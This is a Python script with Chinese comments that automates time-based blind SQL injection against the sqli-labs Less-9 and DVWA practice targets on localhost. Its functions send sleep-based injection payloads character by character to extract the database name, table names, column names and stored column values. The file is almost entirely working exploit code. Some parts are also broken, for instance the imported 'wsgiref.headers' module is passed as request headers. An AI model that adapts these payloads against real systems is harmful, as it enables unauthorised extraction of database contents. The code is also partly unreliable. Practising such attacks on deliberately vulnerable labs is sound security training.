# coding:utf-8
from wsgiref import headers

import requests
import datetime
import time


# 获取数据库名长度
def database_len():
    for i in range(1, 10):
        url = '''http://127.0.0.1/sqli-labs/Less-9/index.php'''
        payload = '''?id=1' and if(length(database())>%s,sleep(1),0)''' % i
        # print(url+payload+'%23')
        time1 = datetime.datetime.now()
        r = requests.get(url + payload + '%23')
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 1:
            print(i)
        else:
            print(i)
            break
    print('database_len:', i)


database_len()


# 获取数据库名
def GetDBName():
    name = ''
    for j in range(1, 9):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            url = '''http://127.0.0.1/sqli-labs/Less-9'''
            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(1),1)''' % (
                j, i)
            # print(url+payload+'%23')
            time1 = datetime.datetime.now()
            r = requests.get(url + payload + '%23')
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 1:
                name += i
                print(name)
                break
    print('database_name:', name)


GetDBName()


# 获取表名
def getTables(table_schema):
    payloads = ',rotabcdefghijklmnpqsuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@_.{}*'  # 区分大小写的
    flag = ""
    key = 0
    print("Start")
    for i in range(1, 5000):
        if key == 1:
            break
        for payload in payloads:
            starttime = time.time()  # 记录当前时间

            # print ("test letter is:%s"%payload)
            url = "1' and if((substr((select group_concat(table_name) from information_schema.tables where table_schema='%s'),%s,1)='%s'),sleep(5),sleep(0))#&&Submit=Submit#" % (
            table_schema, i, payload)  # 全部表名
            url = url.replace(',', '%2C')
            url = url.replace('=', '%3D', 1)
            url = url.replace('#', '%23', 1)

            url = "http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=" + url

            url = url.replace(' ', '%20')
            url = url.replace("'", '%27')

            res = requests.get(url, headers=headers)

            if time.time() - starttime >= 5:
                flag += payload
                print("Table is:%s" % flag)
                break
            else:
                if payload == '*':
                    key = 1
                    break
    print('[Finally] all_table is %s' % flag)


# 获取字段名
def getColumns(table_name):
    payloads = ',rotabcdefghijklmnpqsuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@_.{}*() '  # 区分大小写的
    flag = ""
    key = 0
    print("Start")
    for i in range(1, 5000):
        if key == 1:
            break
        for payload in payloads:
            starttime = time.time()  # 记录当前时间

            # print ("test letter is:%s"%payload)
            url = "1' and if((substr((select group_concat(column_name) from information_schema.columns where table_name='%s'),%s,1)='%s'),sleep(5),sleep(0))#&&Submit=Submit#" % (
            table_name, i, payload)  # 全部列名
            url = url.replace(',', '%2C')
            url = url.replace('=', '%3D', 1)
            url = url.replace('#', '%23', 1)

            url = "http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=" + url

            url = url.replace(' ', '%20')
            url = url.replace("'", '%27')

            res = requests.get(url, headers=headers)
            if time.time() - starttime >= 5:
                flag += payload
                print("column_name is:%s" % flag)
                break
            else:
                if payload == '*':
                    key = 1
                    break
    print('[Finally] column_name is %s' % flag)


# 获取表内字段值
def getColumn_value(column_name, table_name):
    payloads = ',rotabcdefghijklmnpqsuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@_.{}*() '  # 区分大小写的
    flag = ""
    key = 0
    print("Start")
    for i in range(1, 5000):
        if key == 1:
            break
        for payload in payloads:
            starttime = time.time()  # 记录当前时间

            # print ("test letter is:%s"%payload)
            url = "1' and if((substr((select group_concat(%s) from %s),%s,1)='%s'),sleep(5),sleep(0))#&Submit=Submit#" % (
            column_name, table_name, i, payload)  # 全部列名
            url = url.replace(',', '%2C')
            url = url.replace('=', '%3D', 1)
            url = url.replace('#', '%23', 1)
            url = url.replace('(', '%28')
            url = url.replace(')', '%29')

            url = "http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=" + url

            url = url.replace(' ', '+')
            url = url.replace("'", '%27')

            # print ("test url is %s\n"%url)
            # 1' and if((substr((select group_concat(user_id) from users),1,1)='1'),sleep(5),sleep(0))#

            res = requests.get(url, headers=headers)
            if time.time() - starttime >= 5:
                flag += payload
                print("value is:%s" % flag)
                break
            else:
                if payload == '*':
                    key = 1
                    break
    print('[Finally] value is %s' % flag)









